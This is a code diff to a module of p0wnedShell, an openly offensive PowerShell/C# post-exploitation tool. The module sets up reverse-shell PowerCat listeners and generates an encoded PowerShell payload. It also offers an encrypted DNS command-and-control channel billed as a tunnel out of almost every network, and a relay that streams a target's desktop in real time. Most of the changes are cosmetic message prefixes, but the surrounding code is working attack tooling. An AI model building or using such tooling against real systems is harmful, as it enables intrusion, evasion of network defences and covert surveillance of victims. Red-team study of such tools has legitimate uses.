@@ -15,10 +15,10 @@ namespace p0wnedShell
 			Program.PrintBanner(toPrint);
 		}
 	
-		public static void PowerMenu()
+		public static void Menu()
         {
 			PowerBanner();
-			Console.WriteLine(" 1. Setup an Reversed PowerCat Listener.");
+			Console.WriteLine(" 1. Setup an Reversed PowerCat Listener and generate a Powershell Payload.");
 			Console.WriteLine();
 			Console.WriteLine(" 2. Connect to a remote PowerCat Listener.");
 			Console.WriteLine();
@@ -79,7 +79,7 @@ namespace p0wnedShell
         {
 			PowerBanner();			
 			Console.ForegroundColor = ConsoleColor.Yellow;
-			Console.WriteLine("Setup an reversed listener so remote clients can connect-back to you.\n"); 
+			Console.WriteLine("[+] Setup an reversed listener so remote clients can connect-back to you.\n"); 
 			Console.ResetColor();
 			
 			int Lport = 0;
@@ -97,7 +97,7 @@ namespace p0wnedShell
 			 
 			if (LocalIPAddress != null)
 			{
-				Console.Write("\n[+] Our local IP address is: {0}, do you want to use this?  (y/n) > ", LocalIPAddress);
+				Console.Write("[+] Our local IP address is: {0}, do you want to use this?  (y/n) > ", LocalIPAddress);
 				Lhost = LocalIPAddress;
 				
 			}
@@ -112,7 +112,7 @@ namespace p0wnedShell
 					{
 						try
 						{
-							Console.Write("\nEnter ip address of your PowerCat Listener (e.g. 127.0.0.1): ");
+							Console.Write("\n[+] Enter ip address of your PowerCat Listener (e.g. 127.0.0.1): ");
 							Console.ForegroundColor = ConsoleColor.Green;
 							Lhost = IPAddress.Parse(Console.ReadLine());
 							Console.ResetColor();
@@ -140,7 +140,7 @@ namespace p0wnedShell
             {
 				try
 				{
-					Console.Write("Now Enter the listening port of your PowerCat Listener (e.g. 1337 or 4444): ");
+					Console.Write("[+] Now Enter the listening port of your PowerCat Listener (e.g. 1337 or 4444): ");
 					Console.ForegroundColor = ConsoleColor.Green;
 					Lport = int.Parse(Console.ReadLine());
 					Console.ResetColor();
@@ -196,8 +196,28 @@ namespace p0wnedShell
 				Console.ReadLine();	
 				return;
 			}
-			
-			Console.WriteLine("\n[+] Please wait while setting up our Listener...\n");
+
+            Console.Write("\n[+] Do you want to view the Encoded Payload? (y/n) > ");
+            input = Console.ReadLine();
+            Console.WriteLine();
+            switch (input.ToLower())
+            {
+                case "y":
+                    P0wnedListener.Execute("Get-Content ./EncodedPayload.bat");
+                    Console.WriteLine();
+                    break;
+                case "n":
+                    break;
+                default:
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
+                    Console.ResetColor();
+                    Console.WriteLine("Press Enter to Continue...");
+                    Console.ReadLine();
+                    return;
+            }
+
+        Console.WriteLine("[+] Now please wait while setting up our Listener...\n");
 			
 			string Reversed = "powercat -l -p "+Lport+" -t 1000 -Verbose";
 			try
@@ -216,7 +236,7 @@ namespace p0wnedShell
         {
 			PowerBanner();
 			Console.ForegroundColor = ConsoleColor.Yellow;
-			Console.WriteLine("Let's connect to a remote listener..\n"); 
+			Console.WriteLine("[+] Let's connect to a remote listener..\n"); 
 			Console.ResetColor();
 			
 			int Rport = 0;
@@ -226,7 +246,7 @@ namespace p0wnedShell
 			{
 				try
 				{
-					Console.Write("\nEnter ip address of your remote PowerCat Listener (e.g. 192.168.1.1): ");
+					Console.Write("[+] Enter ip address of your remote PowerCat Listener (e.g. 192.168.1.1): ");
 					Console.ForegroundColor = ConsoleColor.Green;
 					Rhost = IPAddress.Parse(Console.ReadLine());
 					Console.ResetColor();
@@ -236,7 +256,7 @@ namespace p0wnedShell
 				catch
 				{
 					Console.ForegroundColor = ConsoleColor.Red;
-					Console.WriteLine("\n[+] That's not a valid IP address, Please Try again");
+					Console.WriteLine("\n[+] That's not a valid IP address, Please Try again\n");
 					Console.ResetColor();
 				}
 			}
@@ -245,7 +265,7 @@ namespace p0wnedShell
             {
 				try
 				{
-					Console.Write("Now Enter the listening port of your PowerCat Listener (e.g. 1337 or 4444): ");
+					Console.Write("[+] Now Enter the listening port of your PowerCat Listener (e.g. 1337 or 4444): ");
 					Console.ForegroundColor = ConsoleColor.Green;
 					Rport = int.Parse(Console.ReadLine());
 					Console.ResetColor();
@@ -310,9 +330,9 @@ namespace p0wnedShell
         {
 			PowerBanner();			
 			Console.ForegroundColor = ConsoleColor.Yellow;
-			Console.WriteLine("This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol,"); 
-			Console.WriteLine("which is an effective tunnel out of almost every network.");
-			Console.WriteLine("The server is designed to be run on an authoritative DNS server, so first make sure you have set this up.\n");
+			Console.WriteLine("[+] This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol,"); 
+			Console.WriteLine("[+] which is an effective tunnel out of almost every network.");
+			Console.WriteLine("[+] The server is designed to be run on an authoritative DNS server, so first make sure you have set this up.\n");
 			Console.ResetColor();
 
 			string Domain = "";
@@ -390,9 +410,9 @@ namespace p0wnedShell
         {
             PowerBanner();
             Console.ForegroundColor = ConsoleColor.Yellow;
-            Console.WriteLine("Creates an Reversed Listener/Server for Nikhil Mittal's Show-TargetScreen function,");
-            Console.WriteLine("which can be used with Client Side Attacks. This code can stream a target's desktop in real time");
-            Console.WriteLine("and could be seen in browsers which support MJPEG (Firefox).\n");
+            Console.WriteLine("[+] Creates an Reversed Listener/Server for Nikhil Mittal's Show-TargetScreen function,");
+            Console.WriteLine("[+] which can be used with Client Side Attacks. This code can stream a target's desktop in real time");
+            Console.WriteLine("[+] and could be seen in browsers which support MJPEG (Firefox).\n");
             Console.ResetColor();
 
             int Lport = 0;
@@ -402,7 +422,7 @@ namespace p0wnedShell
             {
                 try
                 {
-                    Console.Write("Please Enter the listening port of your PowerCat Listener (e.g. 443): ");
+                    Console.Write("[+] Please Enter the listening port of your PowerCat Listener (e.g. 443): ");
                     Console.ForegroundColor = ConsoleColor.Green;
                     Lport = int.Parse(Console.ReadLine());
                     Console.ResetColor();
@@ -431,7 +451,7 @@ namespace p0wnedShell
             {
                 try
                 {
-                    Console.Write("Now Enter a local relay port to which Show-TargetScreen connects (e.g. 9000): ");
+                    Console.Write("[+] Now Enter a local relay port to which Show-TargetScreen connects (e.g. 9000): ");
                     Console.ForegroundColor = ConsoleColor.Green;
                     Rport = int.Parse(Console.ReadLine());
                     Console.ResetColor();
